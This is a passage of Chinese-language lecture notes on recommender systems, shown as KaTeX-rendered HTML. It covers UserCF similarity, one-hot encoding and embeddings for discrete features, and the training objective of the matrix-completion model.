xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">nk</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span> 个相似物品，用公式预估用户对每个物品的兴趣分数</li><li>返回分数最⾼的 100 个物品，作为召回结果</li></ol><p><img src="image_rTwrj0ruku.png" alt=""></p><h2 id="3-4-总结">3.4 总结</h2><p>**UserCF 的基本思想：**用户 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">u_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 跟用户 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">u_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 相似，而且  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">u_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 喜欢某物品，那么 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">u_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 也可能喜欢该物品。</p><p>**用户相似度：**如果用户 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">u_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 跟用户 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">u_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 喜欢的物品有很大重叠，那么 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">u_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>u</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">u_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 相似，计算公式为：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">sim</mi><mo>⁡</mo><mrow><mo fence="true">(</mo><msub><mi>u</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>u</mi><mn>2</mn></msub><mo fence="true">)</mo></mrow><mo>=</mo><mfrac><mrow><mo fence="true">∣</mo><mi mathvariant="script">J</mi><mi mathvariant="normal">_</mi><mn>1</mn><mo>∩</mo><mi mathvariant="script">J</mi><mi mathvariant="normal">_</mi><mn>2</mn><mo fence="true">∣</mo></mrow><msqrt><mrow><mrow><mo fence="true">∣</mo><mi mathvariant="script">J</mi><mi mathvariant="normal">_</mi><mn>1</mn><mo fence="true">∣</mo></mrow><mo>⋅</mo><mrow><mo fence="true">∣</mo><mi mathvariant="script">J</mi><mi mathvariant="normal">_</mi><mn>2</mn><mo fence="true">∣</mo></mrow></mrow></msqrt></mfrac></mrow><annotation encoding="application/x-tex">\operatorname{sim}\left(u_{1}, u_{2}\right)=\frac{\left|\mathcal{J}\_{1} \cap \mathcal{J}\_{2}\right|}{\sqrt{\left|\mathcal{J}\_{1}\right| \cdot\left|\mathcal{J}\_{2}\right|}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mord mathrm">s</span><span class="mord mathrm">i</span><span class="mord mathrm">m</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.3379900000000005em;vertical-align:-1.7300000000000002em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.60799em;"><span style="top:-2.11em;"><span class="pstrut" style="height:3.243985em;"></span><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.243985em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathcal" style="margin-right:0.18472em;">J</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">1</span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathcal" style="margin-right:0.18472em;">J</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">2</span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.2039849999999994em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.8800000000000001em;"><svg width='400em' height='1.8800000000000001em' viewBox='0 0 400000 1944' preserveAspectRatio='xMinYMin slice'><path d='M983 90l0 -0c4,-6.7,10,-10,18,-10 H400000v40H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5c53.7,-170.3,84.5,-266.8,92.5,-289.5zM1001 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5960150000000002em;"><span></span></span></span></span></span></span></span><span style="top:-3.473985em;"><span class="pstrut" style="height:3.243985em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.983995em;"><span class="pstrut" style="height:3.243985em;"></span><span class="mord"><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathcal" style="margin-right:0.18472em;">J</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">1</span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.18472em;">J</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">2</span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8679800000000001em;"><span style="top:-2.2559899999999997em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.26698em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span><span style="top:-2.86798em;"><span class="pstrut" style="height:2.606em;"></span><span class="delimsizinginner delim-size1"><span>∣</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000999999999993em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.7300000000000002em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><hr><h1>4 离散特征的处理</h1><p>离散特征在推荐系统中很常见，常见的离散特征如下：</p><ol><li>性别：男、⼥两种类别。</li><li>国籍：中国、美国、印度等200个国家。</li><li>英⽂单词：常见的英文单词有几万个。</li><li>物品ID：小红书有几亿篇笔记，每篇笔记有⼀个ID。</li><li>用户ID：小红书有几亿个用户，每个用户有⼀个ID。</li></ol><p>离散特征的处理分两步：</p><ol><li><strong>建立字典</strong>：把类别映射成序号。</li><li><strong>向量化</strong>：把序号映射成向量。<ul><li>One-hot 编码：把序号映射成⾼维稀疏向量</li><li>Embedding：把序号映射成低维稠密向量</li></ul></li></ol><h2 id="4-1-独热编码">4.1 独热编码</h2><p>独热编码是用和物品类别数量一样维数的向量表示来类别，例如使用2维向量来表示性别：</p><ul><li>未知 → 0 → [0, 0]</li><li>男 → 1 → [1, 0]</li><li>女 → 2 → [0, 1]</li></ul><h3 id="4-1-1-优点">4.1.1 优点</h3><ol><li>**解决分类数据处理问题：**独热编码将离散分类特征转换为机器学习算法易于处理的二进制格式，提高了算法对离散特征的处理能力。</li><li>**避免引入数值偏误：**通过将每个类别映射到独立的二进制向量，独热编码消除了类别间可能存在的错误数值关系，从而避免了算法基于这些关系做出不准确的预测。</li></ol><h3 id="4-1-2-缺点">4.1.2 缺点</h3><ol><li>**维度增加：**当类别数量较多时，独热编码会显著增加特征空间的维度，可能导致计算复杂性和过拟合问题。</li><li>**信息损失风险：**独热编码可能无法充分捕捉类别间的潜在关系或顺序信息，从而在某些情况下导致有用信息的丢失。</li></ol><h2 id="4-2-embedding">4.2 Embedding</h2><p><img src="image_-LkqBiMHPZ.png" alt=""></p><p>Embedding 把每个序号映射成一个低维向量，参数数量计算如下：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>参数数量</mtext><mo>=</mo><mtext>向量维度</mtext><mo>×</mo><mtext>类别数量</mtext></mrow><annotation encoding="application/x-tex">参数数量=向量维度 \times 类别数量</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">量</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">维</span><span class="mord cjk_fallback">度</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">类</span><span class="mord cjk_fallback">别</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">量</span></span></span></span></span></p><p>例如，设 Embedding 得到的向量都是 4 维的，一共有200个国籍，那么参数数量为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>×</mo><mn>200</mn><mo>=</mo><mn>800</mn></mrow><annotation encoding="application/x-tex">4 \times 200=800</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">8</span><span class="mord">0</span><span class="mord">0</span></span></span></span>。</p><h3 id="4-2-1-embedding得到的向量的物理意义">4.2.1 Embedding得到的向量的物理意义</h3><p><img src="image_lR517m69Na.png" alt=""></p><p>图中的一个点是每个物品的 Embedding，相邻的点关系越接近。可以通过将两个无法比较的文字映射成向量，接下来就能实现对他们的计算。</p><h2 id="4-3-总结">4.3 总结</h2><p>离散特征处理有两种方法：独热编码和词嵌入。而当类别很大的时候，使用词嵌入。</p><hr><h1>5 矩阵补充</h1><h2 id="5-1-模型结构">5.1 模型结构</h2><p><img src="image_7iyIgycPzI.png" alt=""></p><p>上面这个图展示了如何使用 Embedding 做推荐，模型的输入是一个用户 ID 和物品 ID，模型的输出是一个实数，是用户对物品兴趣的预估值。这个数越大，表示用户对物品越感兴趣。这个模型就是矩阵补充模型。</p><h2 id="5-2-模型训练">5.2 模型训练</h2><p>开始训练之前，要准备一个数据集：（用户 ID，物品 ID，兴趣分数）的集合，记作 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Ω</mi><mo>=</mo><mo stretchy="false">{</mo><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>i</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\Omega=\{(u, i, y)\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Ω</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mopen">(</span><span class="mord mathdefault">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mclose">}</span></span></span></span>。</p><p>数据集中的兴趣分数是系统记录的，分数最低是 0 分，最高是 4 分，比如：</p><ul><li>曝光但是没有点击记 0 分</li><li>点击、点赞、收藏、转发各记 1 分</li></ul><p>之后把用户 ID 和物品 ID 映射成向量，例如第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">u</span></span></span></span> 号用户映射为向量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>u</mi></msub></mrow><annotation encoding="application/x-tex">a_u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">u</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span> 号物品映射为向量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">b_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。就变成了一个优化问题的求解，得到参数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span>：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><munder><mo><mi>min</mi><mo>⁡</mo></mo><mrow><mi>A</mi><mo separator="true">,</mo><mi>B</mi></mrow></munder><munder><mo>∑</mo><mrow><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>i</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>∈</mo><mi mathvariant="normal">Ω</mi></mrow></munder><msup><mrow><mo fence="true">(</mo><mi>y</mi><mo>−</mo><mrow><mo fence="true">⟨</mo><msub><mi>a</mi><mi>u</mi></msub><mo separator="true">,</mo><mi>b</mi><mi mathvariant="normal">_</mi><mi>i</mi><mo fence="true">⟩</mo></mrow><mo fence="true">)</mo></mrow><mn>2</mn></msup><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">\min_{A, B} \sum_{(u, i, y) \in \Omega}\left(y-\left\langle a_{u}, {b}\_{i}\right\rangle\right)^{2}.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.5700130000000003em;vertical-align:-1.516005em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.66786em;"><span style="top:-2.3556690000000002em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">A</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.05017em;">B</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop">min</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.880439em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.808995em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">u</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span><span class="mclose mtight">)</span><span class="mrel mtight">∈</span><span class="mord mtight">Ω</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.516005em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">⟨</span></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" 